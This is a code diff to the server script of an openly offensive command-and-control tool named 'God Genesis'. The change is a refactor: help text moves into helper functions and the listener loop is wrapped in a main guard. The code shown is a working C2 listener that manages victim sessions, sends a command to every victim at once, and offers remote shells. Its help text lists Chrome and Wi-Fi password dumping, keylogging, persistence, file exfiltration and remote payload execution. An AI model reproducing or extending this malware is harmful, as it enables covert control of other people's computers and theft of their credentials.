@@ -8,6 +8,8 @@ import threading
 import subprocess
 from assets.banner import banner
 from assets.payload_builder import build_payload
+from assets.helper import main_help, shell_help, session_help
+
 
 
 def completer(text, state):
@@ -138,56 +140,7 @@ def shell(target, ip):
             print("keylogger started...")
             continue
         elif command == "help":
-            print('''\n
-                ===================================================================================================
-                  BASIC COMMANDS:
-                ===================================================================================================
-                            help                  --> Show This Options
-                            terminate             --> Exit The Shell Completely
-                            exit                  --> Shell Works In Background And Prompted To C2 Server
-                            clear                 --> Clear The Previous Outputs
-
-                ===================================================================================================
-                  SYSTEM COMMANDS:
-                ===================================================================================================
-                            cd                    --> Change Directory
-                            pwd                   --> Prints Current Working Directory
-                            mkdir *dir_name*      --> Creates A Directory Mentioned
-                            rm *dir_name*         --> Deletes A Directoty Mentioned
-                            powershell [command]  --> Run Powershell Command
-                            start *exe_name*      --> Start Any Executable By Giving The Executable Name
-
-                ===================================================================================================
-                  INFORMATION GATHERING COMMANDS:
-                ===================================================================================================
-                            env                   --> Checks Enviornment Variables
-                            sc                    --> Lists All Services Running
-                            user                  --> Current User
-                            info                  --> Gives Us All Information About Compromised System
-                            av                    --> Lists All antivirus In Compromised System
-
-                ===================================================================================================
-                  DATA EXFILTRATION COMMANDS:
-                ===================================================================================================
-                            download *file_name*  --> Download Files From Compromised System
-                            upload *file_name*    --> Uploads Files To Victim Pc
-
-
-                ===================================================================================================
-                  EXPLOITATION COMMANDS:
-                ===================================================================================================
-                            persistence1          --> Persistance Via Method 1
-                            persistence2          --> Persistance Via Method 2
-                            get                   --> Download Files From Any URL
-                            chrome_pass_dump      --> Dump All Stored Passwords From Chrome Bowser
-                            wifi_password         --> Dump Passwords Of All Saved Wifi Networks
-                            keylogger             --> Starts Key Logging Via Keylogger
-                            dump_keylogger        --> Dump All Logs Done By Keylogger 
-                            python_install        --> Installs Python In Victim Pc Without UI
-
-                            
-
-                            ''')
+            main_help()
         else:
             result = reliable_recv()
             print(result)
@@ -210,91 +163,56 @@ def create_parser():
 parser = create_parser()
 args = parser.parse_args()
 
-print(banner)
-if args.mode == "build":
-    build_payload(args)
-elif args.mode == "listen":
-    ips = []
-    targets = []
-    stop_threads = False
-    connection_to_victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    connection_to_victim.bind((args.ip, args.port))
-    connection_to_victim.listen(10)
-    t1 = threading.Thread(target=server)
-    t1.start()
-    print(f"[+] Listening For Incoming Connection: {args.ip}:{args.port}... \n")
-    
-    while True:
-        command = input(f"{getpass.getuser()}@God-Genesis-C2-Server: ")
-        if command == "sessions -l":
-            count = 0
-            for ip in ips:
-                print("Session " + str(count) + " : " + str(ip))
-                count += 1
+print(banner())
+if __name__ == "__main__":
+    if args.mode == "build":
+        build_payload(args)
+    elif args.mode == "listen":
+        ips = []
+        targets = []
+        stop_threads = False
+        connection_to_victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connection_to_victim.bind((args.ip, args.port))
+        connection_to_victim.listen(10)
+        t1 = threading.Thread(target=server)
+        t1.start()
+        print(f"[+] Listening for incoming connections...\n")
+        while True:
+            command = input(f"┌──({getpass.getuser()}@GodGenesis-C2-Server)\n├──[~{os.getcwd()}]\n└╼ ")
+            if command == "sessions -l":
+                count = 0
+                for ip in ips:
+                    print("Session " + str(count) + " : " + str(ip))
+                    count += 1
+            elif command[:11] == "sessions -i":
+                try:
+                    num = int(command[12:])
+                    targets_num = targets[num]
+                    targets_ip = ips[num]
+                    shell(targets_num, targets_ip)
+                except:
+                    print("GOD GENESIS doesn't recognize any session with that number")
+                    
+            elif command == 'clear':
+                subprocess.run(['clear'], shell=False)
+            elif command[:7] == 'sendall':
+                x = len(targets)
+                print(x)
+                i = 0
+                try:
+                    while i < x:
+                        tarnumber = targets[i]
+                        print(tarnumber)
+                        sendtoall(tarnumber, command)
+                        i += 1
+                except Exception as e:
+                    print(f'Failed: {e}')
                 
-        elif command[:11] == "sessions -i":
-            try:
-                num = int(command[12:])
-                targets_num = targets[num]
-                targets_ip = ips[num]
-                shell(targets_num, targets_ip)
-            except:
-                print("GOD GENESIS doesn't recognize any session with that number")
-                
-        elif command == 'clear':
-            subprocess.run(['clear'], shell=False)
-            
-        elif command[:7] == 'sendall':
-            x = len(targets)
-            print(x)
-            i = 0
-            try:
-                while i < x:
-                    tarnumber = targets[i]
-                    print(tarnumber)
-                    sendtoall(tarnumber, command)
-                    i += 1
-            except Exception as e:
-                print(f'Failed: {e}')
-                
-        elif command == 'shell_help':
-            print('''\n
-                            help                 --> Show this options
-                            terminate            --> Exit the shell
-                            clear                --> Clear the previous outputs
-                            cd                   --> Change Directory
-                            pwd                  --> Prints Current Working Directory
-                            python_install       --> Installs python in victim pc
-                            env                  --> Checks Enviornment Variables
-                            sc                   --> Lists all services running
-                            user                 --> Current user
-                            info                 --> Gives us full information about victim pc
-                            download             --> Download files from compromised system
-                            upload               --> uploads file to victim pc
-                            persistence1         --> Persistance via method 1
-                            persistence2         --> Persistance via method 2
-                            get                  --> Sends file from attacker pc and executes at victim pc
-                            av                   --> Lists all antivirus
-                            chrome_pass_dump     --> Dump all stored passwords in chrome browser
-                            wifi_password        --> Dump passwords of all saved wifi networks
-                            keyboard_capture            --> Starts logging via keylogger
-                            dump_keylogger       --> Dump all logs done by keylogger as of now
-                            powershell [command] --> Run Powershell Command
-                            start                --> Start any executable by giving the executable name 
-                            sessions -l          --> List Down All The Victims Connected To C2 Server
-                            sessions -i [session number]  --> Interact With Each Sessions Individually
-                            sendall              --> Send Same Command To All The Victim's System
-                            ''')
-        elif command == 'help':
-            print("""
-            sessions -l          --> List Down All The Victims Connected To C2 Server
-            sessions -i [session number]  --> Interact With Each Sessions Individually
-            sendall              --> Send Same Command To All The Victim's System      
-            shell_help           --> All commands before and after getting shell
-            """)
-            
-        else:
-            print(f"Command Not Found: {command}")
-
-else:
-    print("c2c.py: use '-h/--help' to show help message")
+            elif command == 'shell_help':
+                shell_help()
+            elif command == 'help':
+                session_help()
+            else:
+                print(f"Command Not Found: {command}")
+    else:
+        print("c2c.py: use '-h/--help' to show help message")
